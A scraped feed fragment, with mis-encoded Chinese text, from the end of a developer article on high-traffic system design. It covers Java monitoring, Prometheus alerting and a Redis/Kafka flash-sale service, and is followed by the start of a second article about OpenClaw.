            <span class="hljs-comment">// å¼‚æ­¥æ›´æ–°ç»Ÿè®¡æ•°æ®</span>
            statisticsService.updateOrderStats(order);
            
            <span class="hljs-comment">// å¼‚æ­¥é€šçŸ¥åº“å­˜ç³»ç»Ÿ</span>
            inventoryService.notifyOrderCreated(order);
        }
    }
}
</code></pre>
<h2 data-id="heading-23">07 ç›‘æ§ä¸æ²»ç†ï¼šç³»ç»Ÿçš„çœ¼ç›å’Œå¤§è„‘</h2>
<p>æ²¡æœ‰ç›‘æ§çš„ç³»ç»Ÿå°±åƒç›²äººå¼€è½¦ã€‚åƒä¸‡çº§ç³»ç»Ÿéœ€è¦å®Œå–„çš„ç›‘æ§ä½“ç³»ã€‚</p>
<h3 data-id="heading-24">å…¨é“¾è·¯ç›‘æ§</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. é“¾è·¯è¿½è¸ªï¼ˆåŸºäºSkyWalkingï¼‰</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TracingConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Tracer <span class="hljs-title function_">skywalkingTracer</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// SkyWalkingè‡ªåŠ¨æ³¨å…¥ï¼Œåªéœ€æ·»åŠ ä¾èµ–</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SkywalkingTracer</span>();
    }
}

<span class="hljs-comment">// åœ¨ä¸šåŠ¡ä»£ç ä¸­è‡ªåŠ¨è¿½è¸ª</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductService</span> {
    
    <span class="hljs-meta">@Trace(operationName = "ProductService.getProduct")</span> <span class="hljs-comment">// SkyWalkingæ³¨è§£</span>
    <span class="hljs-meta">@Tag(key = "productId", value = "arg[0]")</span> <span class="hljs-comment">// æ·»åŠ æ ‡ç­¾</span>
    <span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProduct</span><span class="hljs-params">(Long productId)</span> {
        <span class="hljs-comment">// ä¸šåŠ¡é€»è¾‘</span>
        <span class="hljs-keyword">return</span> productRepository.findById(productId).orElse(<span class="hljs-literal">null</span>);
    }
}

<span class="hljs-comment">// 2. æŒ‡æ ‡ç›‘æ§ï¼ˆMicrometer + Prometheusï¼‰</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MetricsConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> MeterRegistry <span class="hljs-title function_">meterRegistry</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrometheusMeterRegistry</span>(PrometheusConfig.DEFAULT);
    }
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> TimedAspect <span class="hljs-title function_">timedAspect</span><span class="hljs-params">(MeterRegistry registry)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TimedAspect</span>(registry);
    }
}

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Counter orderCounter;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Timer orderTimer;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderService</span><span class="hljs-params">(MeterRegistry registry)</span> {
        orderCounter = Counter.builder(<span class="hljs-string">"orders.created"</span>)
            .description(<span class="hljs-string">"åˆ›å»ºçš„è®¢å•æ•°é‡"</span>)
            .tag(<span class="hljs-string">"type"</span>, <span class="hljs-string">"normal"</span>)
            .register(registry);
        
        orderTimer = Timer.builder(<span class="hljs-string">"orders.process.time"</span>)
            .description(<span class="hljs-string">"è®¢å•å¤„ç†æ—¶é—´"</span>)
            .publishPercentiles(<span class="hljs-number">0.5</span>, <span class="hljs-number">0.95</span>, <span class="hljs-number">0.99</span>) <span class="hljs-comment">// 50%, 95%, 99%åˆ†ä½æ•°</span>
            .register(registry);
    }
    
    <span class="hljs-meta">@Timed(value = "orders.create", extraTags = {"priority", "high"})</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(OrderRequest request)</span> {
        <span class="hljs-keyword">return</span> orderTimer.record(() -&gt; {
            <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> processOrder(request);
            orderCounter.increment();
            <span class="hljs-keyword">return</span> order;
        });
    }
}

<span class="hljs-comment">// 3. å¥åº·æ£€æŸ¥</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomHealthIndicator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HealthIndicator</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> DataSource dataSource;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisConnectionFactory redisConnectionFactory;
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Health <span class="hljs-title function_">health</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ£€æŸ¥æ•°æ®åº“è¿æ¥</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">dbHealthy</span> <span class="hljs-operator">=</span> checkDatabase();
        
        <span class="hljs-comment">// æ£€æŸ¥Redisè¿æ¥</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">redisHealthy</span> <span class="hljs-operator">=</span> checkRedis();
        
        <span class="hljs-comment">// æ£€æŸ¥ç£ç›˜ç©ºé—´</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">diskHealthy</span> <span class="hljs-operator">=</span> checkDiskSpace();
        
        <span class="hljs-keyword">if</span> (dbHealthy &amp;&amp; redisHealthy &amp;&amp; diskHealthy) {
            <span class="hljs-keyword">return</span> Health.up()
                .withDetail(<span class="hljs-string">"database"</span>, <span class="hljs-string">"connected"</span>)
                .withDetail(<span class="hljs-string">"redis"</span>, <span class="hljs-string">"connected"</span>)
                .withDetail(<span class="hljs-string">"disk"</span>, <span class="hljs-string">"sufficient"</span>)
                .build();
        } <span class="hljs-keyword">else</span> {
            Map&lt;String, Object&gt; details = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
            details.put(<span class="hljs-string">"database"</span>, dbHealthy ? <span class="hljs-string">"connected"</span> : <span class="hljs-string">"disconnected"</span>);
            details.put(<span class="hljs-string">"redis"</span>, redisHealthy ? <span class="hljs-string">"connected"</span> : <span class="hljs-string">"disconnected"</span>);
            details.put(<span class="hljs-string">"disk"</span>, diskHealthy ? <span class="hljs-string">"sufficient"</span> : <span class="hljs-string">"insufficient"</span>);
            
            <span class="hljs-keyword">return</span> Health.down().withDetails(details).build();
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkDatabase</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> dataSource.getConnection().isValid(<span class="hljs-number">5</span>);
        } <span class="hljs-keyword">catch</span> (SQLException e) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }
}
</code></pre>
<h3 data-id="heading-25">æ™ºèƒ½å‘Šè­¦</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># Prometheuså‘Šè­¦è§„åˆ™</span>
<span class="hljs-attr">groups:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">application_alerts</span>
    <span class="hljs-attr">rules:</span>
      <span class="hljs-comment"># é”™è¯¯ç‡å‘Šè­¦</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">alert:</span> <span class="hljs-string">HighErrorRate</span>
        <span class="hljs-attr">expr:</span> <span class="hljs-string">rate(http_requests_total{status=~"5.."}[5m])</span> <span class="hljs-string">/</span> <span class="hljs-string">rate(http_requests_total[5m])</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">0.01</span>
        <span class="hljs-attr">for:</span> <span class="hljs-string">2m</span>
        <span class="hljs-attr">labels:</span>
          <span class="hljs-attr">severity:</span> <span class="hljs-string">critical</span>
        <span class="hljs-attr">annotations:</span>
          <span class="hljs-attr">summary:</span> <span class="hljs-string">"é«˜é”™è¯¯ç‡å‘Šè­¦"</span>
          <span class="hljs-attr">description:</span> <span class="hljs-string">"é”™è¯¯ç‡è¶…è¿‡1% (å½“å‰å€¼: <span class="hljs-template-variable">{{ $value }}</span>)"</span>
      
      <span class="hljs-comment"># å»¶è¿Ÿå‘Šè­¦</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">alert:</span> <span class="hljs-string">HighLatency</span>
        <span class="hljs-attr">expr:</span> <span class="hljs-string">histogram_quantile(0.95,</span> <span class="hljs-string">rate(http_request_duration_seconds_bucket[5m]))</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">1</span>
        <span class="hljs-attr">for:</span> <span class="hljs-string">5m</span>
        <span class="hljs-attr">labels:</span>
          <span class="hljs-attr">severity:</span> <span class="hljs-string">warning</span>
        <span class="hljs-attr">annotations:</span>
          <span class="hljs-attr">summary:</span> <span class="hljs-string">"é«˜å»¶è¿Ÿå‘Šè­¦"</span>
          <span class="hljs-attr">description:</span> <span class="hljs-string">"95åˆ†ä½å»¶è¿Ÿè¶…è¿‡1ç§’ (å½“å‰å€¼: <span class="hljs-template-variable">{{ $value }}</span>s)"</span>
      
      <span class="hljs-comment"># æœåŠ¡å®•æœºå‘Šè­¦</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">alert:</span> <span class="hljs-string">ServiceDown</span>
        <span class="hljs-attr">expr:</span> <span class="hljs-string">up</span> <span class="hljs-string">==</span> <span class="hljs-number">0</span>
        <span class="hljs-attr">for:</span> <span class="hljs-string">1m</span>
        <span class="hljs-attr">labels:</span>
          <span class="hljs-attr">severity:</span> <span class="hljs-string">critical</span>
        <span class="hljs-attr">annotations:</span>
          <span class="hljs-attr">summary:</span> <span class="hljs-string">"æœåŠ¡å®•æœºå‘Šè­¦"</span>
          <span class="hljs-attr">description:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{ $labels.job }}</span> æœåŠ¡å·²å®•æœº"</span>
</code></pre>
<h2 data-id="heading-26">08 å®æˆ˜æ¡ˆä¾‹ï¼šç§’æ€ç³»ç»Ÿè®¾è®¡</h2>
<p>è®©æˆ‘ä»¬ç”¨ä¸€ä¸ªå…·ä½“çš„ä¾‹å­æ¥ç»¼åˆè¿ç”¨ä¸Šè¿°æŠ€æœ¯ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SeckillService</span> {
    
    <span class="hljs-comment">// 1. ç¼“å­˜é¢„çƒ­</span>
    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">warmUpCache</span><span class="hljs-params">()</span> {
        List&lt;SeckillProduct&gt; hotProducts = findHotProducts();
        
        hotProducts.parallelStream().forEach(product -&gt; {
            <span class="hljs-type">String</span> <span class="hljs-variable">stockKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"seckill:stock:"</span> + product.getId();
            redisTemplate.opsForValue().set(stockKey, product.getStock());
            
            <span class="hljs-comment">// è®¾ç½®éšæœºè¿‡æœŸæ—¶é—´ï¼Œé˜²æ­¢é›ªå´©</span>
            setWithRandomExpire(stockKey, product.getStock(), <span class="hljs-number">10</span>, TimeUnit.MINUTES);
        });
    }
    
    <span class="hljs-comment">// 2. ç§’æ€å…¥å£ï¼ˆé˜²åˆ·+é™æµï¼‰</span>
    <span class="hljs-meta">@RateLimiter(key = "'seckill:' + #userId", 
                 limit = 1, period = 10, unit = TimeUnit.SECONDS)</span>
    <span class="hljs-keyword">public</span> SeckillResult <span class="hljs-title function_">seckill</span><span class="hljs-params">(Long userId, Long productId)</span> {
        <span class="hljs-comment">// 2.1 èµ„æ ¼æ ¡éªŒï¼ˆRediså®ç°ï¼‰</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">userKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"seckill:user:"</span> + productId + <span class="hljs-string">":"</span> + userId;
        <span class="hljs-keyword">if</span> (Boolean.TRUE.equals(redisTemplate.hasKey(userKey))) {
            <span class="hljs-keyword">return</span> SeckillResult.alreadyParticipated();
        }
        
        <span class="hljs-comment">// 2.2 åº“å­˜é¢„æ‰£å‡ï¼ˆLuaè„šæœ¬ä¿è¯åŸå­æ€§ï¼‰</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">stockKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"seckill:stock:"</span> + productId;
        <span class="hljs-type">Long</span> <span class="hljs-variable">remaining</span> <span class="hljs-operator">=</span> redisTemplate.execute(
            stockDecrScript, 
            Collections.singletonList(stockKey), 
            <span class="hljs-string">"1"</span>
        );
        
        <span class="hljs-keyword">if</span> (remaining &lt; <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// åº“å­˜ä¸è¶³ï¼Œå›æ»š</span>
            redisTemplate.opsForValue().increment(stockKey, <span class="hljs-number">1</span>);
            <span class="hljs-keyword">return</span> SeckillResult.outOfStock();
        }
        
        <span class="hljs-comment">// 2.3 è®°å½•ç”¨æˆ·è´­ä¹°èµ„æ ¼</span>
        redisTemplate.opsForValue().set(userKey, <span class="hljs-string">"1"</span>, <span class="hljs-number">1</span>, TimeUnit.HOURS);
        
        <span class="hljs-comment">// 2.4 å‘é€æ¶ˆæ¯åˆ°é˜Ÿåˆ—ï¼Œå¼‚æ­¥åˆ›å»ºè®¢å•</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">orderKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"seckill:order:"</span> + UUID.randomUUID();
        <span class="hljs-type">SeckillOrderMessage</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SeckillOrderMessage</span>(userId, productId, orderKey);
        
        kafkaTemplate.send(<span class="hljs-string">"seckill-orders"</span>, 
            String.valueOf(productId), 
            JsonUtils.toJson(message)
        );
        
        <span class="hljs-keyword">return</span> SeckillResult.success(orderKey);
    }
    
    <span class="hljs-comment">// 3. å¼‚æ­¥è®¢å•å¤„ç†</span>
    <span class="hljs-meta">@KafkaListener(topics = "seckill-orders", 
                   groupId = "seckill-order-processor")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSeckillOrder</span><span class="hljs-params">(String message)</span> {
        <span class="hljs-type">SeckillOrderMessage</span> <span class="hljs-variable">orderMessage</span> <span class="hljs-operator">=</span> JsonUtils.fromJson(message, SeckillOrderMessage.class);
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 3.1 åˆ›å»ºè®¢å•ï¼ˆæ•°æ®åº“æ“ä½œï¼‰</span>
            <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> createOrderInDB(orderMessage);
            
            <span class="hljs-comment">// 3.2 æ›´æ–°ç¼“å­˜çŠ¶æ€</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">resultKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"seckill:result:"</span> + orderMessage.getOrderKey();
            redisTemplate.opsForValue().set(resultKey, order.getId(), <span class="hljs-number">10</span>, TimeUnit.MINUTES);
            
            <span class="hljs-comment">// 3.3 å‘é€æˆåŠŸé€šçŸ¥</span>
            notifyUser(orderMessage.getUserId(), order);
            
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"å¤„ç†ç§’æ€è®¢å•å¤±è´¥"</span>, e);
            
            <span class="hljs-comment">// å¤±è´¥å¤„ç†ï¼šæ¢å¤åº“å­˜</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">stockKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"seckill:stock:"</span> + orderMessage.getProductId();
            redisTemplate.opsForValue().increment(stockKey, <span class="hljs-number">1</span>);
            
            <span class="hljs-comment">// ç§»é™¤ç”¨æˆ·èµ„æ ¼è®°å½•</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">userKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"seckill:user:"</span> + orderMessage.getProductId() + <span class="hljs-string">":"</span> + orderMessage.getUserId();
            redisTemplate.delete(userKey);
        }
    }
    
    <span class="hljs-comment">// 4. åº“å­˜æ‰£å‡Luaè„šæœ¬</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> DefaultRedisScript&lt;Long&gt; stockDecrScript = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultRedisScript</span>&lt;&gt;(
        <span class="hljs-string">"local key = KEYS[1]\n"</span> +
        <span class="hljs-string">"local decrement = tonumber(ARGV[1])\n"</span> +
        <span class="hljs-string">"local current = redis.call('get', key)\n"</span> +
        <span class="hljs-string">"if not current then\n"</span> +
        <span class="hljs-string">"    return -1\n"</span> +
        <span class="hljs-string">"end\n"</span> +
        <span class="hljs-string">"local currentNum = tonumber(current)\n"</span> +
        <span class="hljs-string">"if currentNum &lt; decrement then\n"</span> +
        <span class="hljs-string">"    return -1\n"</span> +
        <span class="hljs-string">"end\n"</span> +
        <span class="hljs-string">"return redis.call('decrby', key, decrement)"</span>,
        Long.class
    );
}
</code></pre>
<p>æ›´å¤šé¡¹ç›®å®æˆ˜ï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Fsusan.net.cn%2Fproject" target="_blank" title="http://susan.net.cn/project" ref="nofollow noopener noreferrer">javaçªå‡»é˜Ÿ</a></p>
<h2 data-id="heading-27">æ€»ç»“</h2>
<p>è®¾è®¡ä¸€ä¸ªæ‰›ä½åƒä¸‡çº§æµé‡çš„ç³»ç»Ÿï¼Œä¸æ˜¯ç®€å•å †ç ŒæŠ€æœ¯ç»„ä»¶ï¼Œè€Œæ˜¯<strong>æ„å»ºä¸€ä¸ªæœ‰æœºçš„ã€èƒ½è‡ªæˆ‘è°ƒèŠ‚çš„ç”Ÿæ€ç³»ç»Ÿ</strong>ã€‚</p>
<p>é€šè¿‡æœ¬æ–‡çš„åˆ†äº«ï¼Œæˆ‘æƒ³ä½ å·²ç»çœ‹åˆ°äº†ä¸€ä¸ªå®Œæ•´çš„é«˜å¹¶å‘ç³»ç»Ÿæ¶æ„å›¾æ™¯ã€‚</p>
<p>è®©æˆ‘æœ€åæ€»ç»“ä¸€ä¸‹å…³é”®ç‚¹ï¼š</p>
<ol>
<li>
<p><strong>æ¶æ„æ˜¯æ¼”è¿›è€Œæ¥çš„</strong>ï¼šä¸è¦ä¸€å¼€å§‹å°±è¿½æ±‚å®Œç¾æ¶æ„ï¼Œè€Œæ˜¯éšç€ä¸šåŠ¡å¢é•¿ä¸æ–­æ¼”è¿›ã€‚ä»å°è€Œç¾çš„å•ä½“å¼€å§‹ï¼Œé€æ­¥æ‹†åˆ†ã€ä¼˜åŒ–ã€æ‰©å±•ã€‚</p>
</li>
<li>
<p><strong>ç¼“å­˜æ˜¯æ€§èƒ½çš„é“¶å¼¹</strong>ï¼šä½†è¦ç”¨å¾—èªæ˜ã€‚å¤šçº§ç¼“å­˜ã€æ™ºèƒ½æ·˜æ±°ã€é˜²æ­¢ç©¿é€/å‡»ç©¿/é›ªå´©ï¼Œæ¯ä¸ªç»†èŠ‚éƒ½å½±å“å·¨å¤§ã€‚</p>
</li>
<li>
<p><strong>æ•°æ®åº“æ˜¯ç“¶é¢ˆæ‰€åœ¨</strong>ï¼šè¯»å†™åˆ†ç¦»ã€åˆ†åº“åˆ†è¡¨ã€ç´¢å¼•ä¼˜åŒ–ã€SQLè°ƒä¼˜ï¼Œè¿™äº›åŸºæœ¬åŠŸæ¯”ä»»ä½•ç‚«é…·çš„æŠ€æœ¯éƒ½é‡è¦ã€‚</p>
</li>
<li>
<p><strong>å¼‚æ­¥æ˜¯æ‰©å±•çš„å…³é”®</strong>ï¼šèƒ½å¼‚æ­¥çš„ç»ä¸åŒæ­¥ï¼Œèƒ½æ‰¹å¤„ç†çš„ç»ä¸å•æ¡ã€‚æ¶ˆæ¯é˜Ÿåˆ—ã€äº‹ä»¶é©±åŠ¨ã€ååº”å¼ç¼–ç¨‹ï¼Œè®©ç³»ç»Ÿæ¾è€¦åˆã€é«˜å†…èšã€‚</p>
</li>
<li>
<p><strong>ç›‘æ§æ˜¯ç³»ç»Ÿçš„çœ¼ç›</strong>ï¼šæ²¡æœ‰ç›‘æ§çš„ç³»ç»Ÿå°±æ˜¯åœ¨è£¸å¥”ã€‚å…¨é“¾è·¯è¿½è¸ªã€æŒ‡æ ‡ç›‘æ§ã€æ—¥å¿—èšåˆã€æ™ºèƒ½å‘Šè­¦ï¼Œç¼ºä¸€ä¸å¯ã€‚</p>
</li>
<li>
<p><strong>å®¹é”™æ¯”ä¼˜åŒ–æ›´é‡è¦</strong>ï¼šç³»ç»Ÿä¸€å®šä¼šå‡ºé—®é¢˜ï¼Œå…³é”®æ˜¯å¦‚ä½•å¿«é€Ÿå‘ç°ã€å¿«é€Ÿæ¢å¤ã€å¿«é€Ÿæ­¢æŸã€‚ç†”æ–­ã€é™çº§ã€é™æµã€é‡è¯•ï¼Œè¿™äº›æœºåˆ¶æ˜¯ç³»ç»Ÿçš„ä¿é™©ç»³ã€‚</p>
</li>
</ol>
<p>çœŸæ­£çš„æ¶æ„å¤§å¸ˆï¼Œä¸æ˜¯æŒæ¡äº†å¤šå°‘æŠ€æœ¯æ¡†æ¶ï¼Œè€Œæ˜¯èƒ½åœ¨ä¸šåŠ¡éœ€æ±‚ã€æŠ€æœ¯å®ç°ã€å›¢é˜Ÿèƒ½åŠ›ã€èµ„æºçº¦æŸä¹‹é—´æ‰¾åˆ°æœ€ä½³å¹³è¡¡ç‚¹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ–‡è¯»æ‡‚OpenClawæ ¸å¿ƒç‰¹æ€§ä¸åŸç†è§£æ(æ–‡æœ«é™„å›½äº§å¤§æ¨¡å‹+èŠå¤©è½¯ä»¶æ¥å…¥OpenClawè§†é¢‘æ•™ç¨‹åœ°å€)]]></title>    <link>https://juejin.cn/post/7602466689713078287</link>    <guid>https://juejin.cn/post/7602466689713078287</guid>    <pubDate>2026-02-04T02:55:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602466689713078287" data-draft-id="7602106969698566207" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€æ–‡è¯»æ‡‚OpenClawæ ¸å¿ƒç‰¹æ€§ä¸åŸç†è§£æ(æ–‡æœ«é™„å›½äº§å¤§æ¨¡å‹+èŠå¤©è½¯ä»¶æ¥å…¥OpenClawè§†é¢‘æ•™ç¨‹åœ°å€)"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,LangChain,Agent"/> <meta itemprop="datePublished" content="2026-02-04T02:55:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§æ¨¡å‹çœŸå¥½ç©"/> <meta itemprop="url" content="https://juejin.cn/user/3140624091453053"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€æ–‡è¯»æ‡‚OpenClawæ ¸å¿ƒç‰¹æ€§ä¸åŸç†è§£æ(æ–‡æœ«é™„å›½äº§å¤§æ¨¡å‹+èŠå¤©è½¯ä»¶æ¥å…¥OpenClawè§†é¢‘æ•™ç¨‹åœ°å€)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3140624091453053/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§æ¨¡å‹çœŸå¥½ç©
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T02:55:08.000Z" title="Wed Feb 04 2026 02:55:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body 